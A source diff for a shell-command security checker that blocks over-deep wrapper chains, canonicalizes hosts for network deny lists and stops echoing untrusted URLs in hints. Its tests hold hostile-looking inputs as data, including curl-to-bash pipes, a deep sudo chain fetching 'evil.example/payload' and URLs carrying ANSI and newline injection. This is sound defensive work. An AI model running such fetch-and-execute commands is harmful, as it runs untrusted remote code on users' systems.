@@ -358,6 +358,29 @@ pub fn check(
 
     // source/. reuse transport rules: they execute the fetched body.
     for segment in &segments {
+        if crate::extract::wrapper_chain_exceeds_depth(segment) {
+            findings.push(Finding {
+                rule_id: RuleId::AnalysisIncomplete,
+                severity: Severity::High,
+                title: "Execution-wrapper analysis exceeded its depth limit".to_string(),
+                description: "The command nests execution wrappers deeper than Tirith's bounded \
+                              parser can resolve. It is blocked instead of treating an unresolved \
+                              inner command as safe: the network-policy and package checks skip a \
+                              segment they cannot resolve."
+                    .to_string(),
+                evidence: vec![Evidence::CommandPattern {
+                    pattern: "over-deep execution wrapper chain".to_string(),
+                    matched: redact::redact_shell_assignments(&segment.raw),
+                }],
+                human_view: None,
+                agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
+            });
+        }
+    }
+
+    for segment in &segments {
         let Some((resolved_name, args)) = crate::extract::resolve_wrapped_command(segment) else {
             continue;
         };
@@ -1729,37 +1752,13 @@ fn check_pipe_to_interpreter(
                     };
 
                     let description = if is_url_fetch_command(&source_base) {
-                        let show_tirith_run = cfg!(unix)
-                            && supports_tirith_run_hint(&source_base)
-                            && shell != ShellType::PowerShell;
-                        if let Some(url) = extract_urls_from_args(&source.args, shell)
-                            .into_iter()
-                            .next()
-                            .map(|u| sanitize_url_for_display(&u))
-                        {
-                            if show_tirith_run {
-                                format!(
-                                    "{base_desc}\n  Safer: tirith run {url}  \
-                                     \u{2014} or: vet {url}  (https://getvet.sh)"
-                                )
-                            } else {
-                                format!(
-                                    "{base_desc}\n  Safer: vet {url}  \
-                                     (https://getvet.sh)"
-                                )
-                            }
-                        } else if show_tirith_run {
-                            format!(
-                                "{base_desc}\n  Safer: use 'tirith run <url>' \
-                                 or 'vet <url>' (https://getvet.sh) to inspect \
-                                 before executing."
-                            )
-                        } else {
-                            format!(
-                                "{base_desc}\n  Safer: use 'vet <url>' \
-                                 (https://getvet.sh) to inspect before executing."
-                            )
-                        }
+                        format!(
+                            "{base_desc}\n  Safer: run `tirith check --suggest -- <command>`; \
+                             Tirith emits a typed capsule command only when it can prove the \
+                             URL, interpreter, argv, and stdin semantics. Otherwise download \
+                             into a private location (or use `vet <url>`, https://getvet.sh) \
+                             and review the exact bytes before execution."
+                        )
                     } else {
                         base_desc
                     };
@@ -2477,23 +2476,17 @@ fn check_network_destination(segments: &[tokenize::Segment], findings: &mut Vec<
 
 /// Extract a host/IP from a URL-like command argument.
 fn extract_host_from_arg(arg: &str) -> Option<String> {
-    if let Some(scheme_end) = arg.find("://") {
-        let after_scheme = &arg[scheme_end + 3..];
-        let after_userinfo = if let Some(at_idx) = after_scheme.find('@') {
-            &after_scheme[at_idx + 1..]
-        } else {
-            after_scheme
-        };
-        let host_port = after_userinfo.split('/').next().unwrap_or(after_userinfo);
-        let host = strip_port(host_port);
-        if host.is_empty() || host.contains('/') || host.contains('[') {
-            return None;
-        }
-        return Some(host);
+    if arg.contains("://") {
+        let parsed = url::Url::parse(arg).ok()?;
+        return parsed.host().map(|host| match host {
+            url::Host::Domain(domain) => domain.trim_end_matches('.').to_ascii_lowercase(),
+            url::Host::Ipv4(address) => address.to_string(),
+            url::Host::Ipv6(address) => address.to_string(),
+        });
     }
 
     // Bare host/IP like `curl 169.254.169.254/path`.
-    let host_part = arg.split('/').next().unwrap_or(arg);
+    let host_part = arg.split(['/', '?', '#']).next().unwrap_or(arg);
     let host = strip_port(host_part);
 
     if host.parse::<std::net::Ipv4Addr>().is_ok() {
@@ -2548,14 +2541,14 @@ fn is_private_ip(host: &str) -> bool {
     false
 }
 
-/// POSIX fetch commands — eligible for both `tirith run` and `vet` hints.
+/// POSIX URL-fetch commands.
 const POSIX_FETCH_COMMANDS: &[&str] = &["curl", "wget", "http", "https", "xh", "fetch"];
 
-/// PowerShell fetch commands — `vet` hints only (`tirith run` is POSIX-only).
+/// PowerShell URL-fetch commands.
 const POWERSHELL_FETCH_COMMANDS: &[&str] =
     &["iwr", "irm", "invoke-webrequest", "invoke-restmethod"];
 
-/// Source commands that are not URL-fetching (no vet/tirith-run hints).
+/// Source commands that are not URL-fetching.
 const NON_FETCH_SOURCE_COMMANDS: &[&str] = &["scp", "rsync"];
 
 fn is_source_command(cmd: &str) -> bool {
@@ -2569,22 +2562,11 @@ fn is_url_fetch_command(cmd: &str) -> bool {
     POSIX_FETCH_COMMANDS.contains(&cmd) || POWERSHELL_FETCH_COMMANDS.contains(&cmd)
 }
 
-/// Whether this fetch source supports `tirith run` hints (POSIX fetch only).
-fn supports_tirith_run_hint(cmd: &str) -> bool {
-    POSIX_FETCH_COMMANDS.contains(&cmd)
-}
-
 /// Check if string starts with http:// or https:// (case-insensitive scheme).
 fn starts_with_http_scheme(s: &str) -> bool {
     let b = s.as_bytes();
     (b.len() >= 8 && b[..8].eq_ignore_ascii_case(b"https://"))
         || (b.len() >= 7 && b[..7].eq_ignore_ascii_case(b"http://"))
-}
-
-/// Strip control characters from a URL so it cannot inject ANSI escapes /
-/// newlines into the finding description shown to the user.
-fn sanitize_url_for_display(url: &str) -> String {
-    url.chars().filter(|&c| !c.is_ascii_control()).collect()
 }
 
 /// Extract all URLs from command arguments.
@@ -2730,9 +2712,13 @@ pub fn check_network_policy(
 /// Whether `host` matches any list entry: exact, suffix (`.example.com` matches
 /// `sub.example.com`), or IPv4 CIDR.
 fn matches_network_list(host: &str, list: &[String]) -> bool {
+    let Some(canonical_host) = canonical_network_host(host) else {
+        return false;
+    };
     for entry in list {
+        let entry = entry.trim();
         if entry.contains('/') {
-            if let Some(matched) = cidr_contains(host, entry) {
+            if let Some(matched) = cidr_contains(&canonical_host, entry) {
                 if matched {
                     return true;
                 }
@@ -2740,19 +2726,47 @@ fn matches_network_list(host: &str, list: &[String]) -> bool {
             }
         }
 
-        if host.eq_ignore_ascii_case(entry) {
+        // A leading dot is accepted as an explicit suffix-policy spelling, but
+        // matching still requires a DNS label boundary below.
+        let Some(canonical_entry) = canonical_network_host(entry.trim_start_matches('.')) else {
+            continue;
+        };
+        if canonical_host == canonical_entry {
             return true;
         }
 
         // Suffix match: "example.com" matches "sub.example.com".
-        if host.len() > entry.len()
-            && host.ends_with(entry.as_str())
-            && host.as_bytes()[host.len() - entry.len() - 1] == b'.'
+        if canonical_host
+            .strip_suffix(&canonical_entry)
+            .is_some_and(|prefix| prefix.ends_with('.'))
         {
             return true;
         }
     }
     false
+}
+
+/// Canonicalize a policy or extracted host through the URL crate's WHATWG host
+/// parser. This lowercases/IDNA-normalizes domains and canonicalizes IPs; a
+/// terminal DNS root dot is removed so equivalent FQDN spellings compare equal.
+fn canonical_network_host(host: &str) -> Option<String> {
+    let trimmed = host.trim().trim_end_matches('.');
+    if trimmed.is_empty() {
+        return None;
+    }
+    // `url::Host::parse` expects bracketed IPv6 in URL contexts, while policy
+    // files and extracted SCP/SSH destinations use the ordinary bare literal.
+    // Accept IP literals first so validation and enforcement share that form —
+    // otherwise both sides fail to canonicalize and no IPv6 entry ever matches.
+    if let Ok(address) = trimmed.parse::<std::net::IpAddr>() {
+        return Some(address.to_string());
+    }
+    let parsed = url::Host::parse(trimmed).ok()?;
+    Some(match parsed {
+        url::Host::Domain(domain) => domain.trim_end_matches('.').to_ascii_lowercase(),
+        url::Host::Ipv4(address) => address.to_string(),
+        url::Host::Ipv6(address) => address.to_string(),
+    })
 }
 
 /// Check if an IPv4 address is within a CIDR range.
@@ -4897,6 +4911,14 @@ mod tests {
         );
         assert_eq!(extract_host_from_arg("-H"), None);
         assert_eq!(extract_host_from_arg("output.txt"), None);
+        assert_eq!(
+            extract_host_from_arg("https://denied.example/path@allowed.example"),
+            Some("denied.example".to_string())
+        );
+        assert_eq!(
+            extract_host_from_arg("https://denied.example?next=@allowed.example"),
+            Some("denied.example".to_string())
+        );
     }
 
     #[test]
@@ -4925,6 +4947,59 @@ mod tests {
         );
         assert_eq!(findings.len(), 1);
         assert_eq!(findings[0].rule_id, RuleId::CommandNetworkDeny);
+    }
+
+    #[test]
+    fn network_policy_uses_authoritative_url_authority() {
+        let deny = vec!["denied.example".to_string()];
+        for command in [
+            "curl https://denied.example/path@allowed.example",
+            "curl 'https://denied.example?next=@allowed.example'",
+        ] {
+            let findings = check_network_policy(command, ShellType::Posix, &deny, &[]);
+            assert!(findings
+                .iter()
+                .any(|finding| finding.rule_id == RuleId::CommandNetworkDeny),
+                "authoritative denied host must not be replaced by path/query text: {command} -> {findings:?}");
+        }
+    }
+
+    #[test]
+    fn network_policy_canonicalizes_dns_case_root_dot_and_idna() {
+        for (command, denied) in [
+            ("curl https://Sub.EVIL.Example/data", "evil.example"),
+            ("curl https://evil.example./data", "EVIL.EXAMPLE"),
+            ("curl https://bücher.example/data", "xn--bcher-kva.example"),
+        ] {
+            let findings =
+                check_network_policy(command, ShellType::Posix, &[denied.to_string()], &[]);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| finding.rule_id == RuleId::CommandNetworkDeny),
+                "equivalent canonical host must block: {command} / {denied} -> {findings:?}"
+            );
+        }
+
+        assert!(!matches_network_list(
+            "notexample.com",
+            &["example.com".to_string()]
+        ));
+        assert!(matches_network_list(
+            "Safe.Evil.Example.",
+            &[".evil.example".to_string()]
+        ));
+    }
+
+    #[test]
+    fn network_policy_canonicalized_allow_still_precedes_deny() {
+        let findings = check_network_policy(
+            "curl https://SAFE.EVIL.EXAMPLE./data",
+            ShellType::Posix,
+            &["evil.example".to_string()],
+            &["safe.evil.example".to_string()],
+        );
+        assert!(findings.is_empty());
     }
 
     #[test]
@@ -5606,21 +5681,14 @@ mod tests {
         check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
         assert_eq!(findings.len(), 1);
         assert!(
-            findings[0]
-                .description
-                .contains("https://example.com/install.sh"),
-            "should include extracted URL in hint"
-        );
-        assert!(
             findings[0].description.contains("getvet.sh"),
             "should mention vet"
         );
-        if cfg!(unix) {
-            assert!(
-                findings[0].description.contains("tirith run"),
-                "Unix builds should suggest tirith run"
-            );
-        }
+        assert!(
+            findings[0].description.contains("tirith check --suggest"),
+            "the finding should delegate executable rewrites to the verified suggestion path: {}",
+            findings[0].description
+        );
     }
 
     #[test]
@@ -5631,10 +5699,10 @@ mod tests {
         check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
         assert_eq!(findings.len(), 1);
         assert!(
-            findings[0]
-                .description
-                .contains("https://example.com/install.sh"),
-            "should extract URL from quoted arg"
+            findings[0].evidence.iter().any(
+                |e| matches!(e, Evidence::Url { raw } if raw == "https://example.com/install.sh")
+            ),
+            "quoted URL should remain available as structured evidence"
         );
     }
 
@@ -5646,10 +5714,10 @@ mod tests {
         check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
         assert_eq!(findings.len(), 1);
         assert!(
-            findings[0]
-                .description
-                .contains("https://example.com/install.sh"),
-            "should extract URL from --flag=value"
+            findings[0].evidence.iter().any(
+                |e| matches!(e, Evidence::Url { raw } if raw == "https://example.com/install.sh")
+            ),
+            "--flag=value URL should remain available as structured evidence"
         );
     }
 
@@ -5776,8 +5844,7 @@ mod tests {
     }
 
     #[test]
-    fn test_pipe_to_interpreter_hint_sanitizes_ansi_in_url() {
-        // \x1b[31m is an ANSI "red" escape — must be stripped from hint
+    fn test_pipe_to_interpreter_hint_does_not_reemit_ansi_url() {
         let input = "curl https://example.com/\x1b[31mred | bash";
         let segments = tokenize::tokenize(input, ShellType::Posix);
         let mut findings = Vec::new();
@@ -5785,64 +5852,28 @@ mod tests {
         assert_eq!(findings.len(), 1);
         assert!(
             !findings[0].description.contains('\x1b'),
-            "ANSI escape must be stripped from hint URL: {}",
+            "ANSI escape must not reach the static hint: {}",
             findings[0].description
         );
         assert!(
-            findings[0]
-                .description
-                .contains("https://example.com/[31mred"),
-            "URL should be present minus the ESC byte: {}",
+            !findings[0].description.contains("example.com"),
+            "untrusted executable URL data must not be sanitized and re-emitted: {}",
             findings[0].description
         );
     }
 
     #[test]
-    fn test_pipe_to_interpreter_hint_sanitizes_newline_in_url() {
-        // Newline in URL arg could spoof extra output lines
+    fn test_pipe_to_interpreter_hint_does_not_reemit_newline_url() {
         let input = "curl \"https://example.com/\nFAKE: safe\" | bash";
         let segments = tokenize::tokenize(input, ShellType::Posix);
         let mut findings = Vec::new();
         check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
         assert_eq!(findings.len(), 1);
-        // The \n must be stripped — "FAKE" collapses onto the URL, not a separate line
-        let hint_line = findings[0]
-            .description
-            .lines()
-            .find(|l| l.contains("Safer:"))
-            .expect("should have hint line");
         assert!(
-            hint_line.contains("example.com/FAKE"),
-            "newline stripped, FAKE should be part of the URL on the hint line: {hint_line}"
-        );
-        // Verify no line starts with "FAKE" (would indicate injection)
-        assert!(
-            !findings[0]
-                .description
-                .lines()
-                .any(|l| l.starts_with("FAKE")),
-            "newline injection must not create a spoofed output line: {}",
+            !findings[0].description.contains("FAKE")
+                && !findings[0].description.contains("example.com"),
+            "control-bearing URL data must not be sanitized and re-emitted: {}",
             findings[0].description
-        );
-    }
-
-    #[test]
-    fn test_sanitize_url_for_display() {
-        assert_eq!(
-            sanitize_url_for_display("https://ok.com/path"),
-            "https://ok.com/path"
-        );
-        assert_eq!(
-            sanitize_url_for_display("https://evil.com/\x1b[31mred\x1b[0m"),
-            "https://evil.com/[31mred[0m"
-        );
-        assert_eq!(
-            sanitize_url_for_display("https://evil.com/\n\rspoof"),
-            "https://evil.com/spoof"
-        );
-        assert_eq!(
-            sanitize_url_for_display("https://evil.com/\x07bell\x00null"),
-            "https://evil.com/bellnull"
         );
     }
 
@@ -5947,6 +5978,60 @@ mod tests {
         assert!(
             !is_source_command("cat"),
             "cat should not be a source command"
+        );
+    }
+
+    #[test]
+    fn over_deep_wrapper_chain_blocks_instead_of_skipping_the_inner_command() {
+        // resolve_wrapped_command returns None for both "too deep" and "nothing
+        // here", so check_network_policy and the package lookup used to skip a
+        // 65-wrapper chain and never see the executable inner command.
+        for deep in [
+            "sudo ".repeat(64) + "curl http://evil.example/payload",
+            "sudo -u user ".repeat(64) + "curl http://evil.example/payload",
+        ] {
+            let findings = check_default(&deep, ShellType::Posix);
+            assert!(
+                findings.iter().any(|f| {
+                    f.rule_id == RuleId::AnalysisIncomplete && f.severity == Severity::High
+                }),
+                "an over-deep wrapper chain must fail closed: {findings:?}"
+            );
+        }
+
+        // A chain within budget still resolves normally and does NOT get the
+        // depth finding.
+        let shallow = "sudo env command curl http://evil.example/payload";
+        let findings = check_default(shallow, ShellType::Posix);
+        assert!(
+            !findings.iter().any(|f| {
+                f.rule_id == RuleId::AnalysisIncomplete
+                    && f.title.contains("Execution-wrapper analysis")
+            }),
+            "a resolvable chain must not be reported as too deep: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn ipv6_network_policy_matches_in_both_spellings() {
+        // url::Host::parse only takes bracketed IPv6, and both the extracted
+        // host and the policy entry carry the bare literal, so every IPv6
+        // deny entry silently failed to match.
+        assert_eq!(canonical_network_host("::1"), Some("::1".to_string()));
+        assert_eq!(canonical_network_host("[::1]"), Some("::1".to_string()));
+        assert_eq!(
+            canonical_network_host("FD00::1"),
+            canonical_network_host("fd00::1"),
+            "an IPv6 literal canonicalizes independently of case"
+        );
+        // IPv4 and domains are unchanged.
+        assert_eq!(
+            canonical_network_host("10.0.0.1"),
+            Some("10.0.0.1".to_string())
+        );
+        assert_eq!(
+            canonical_network_host("Example.COM."),
+            Some("example.com".to_string())
         );
     }
 }
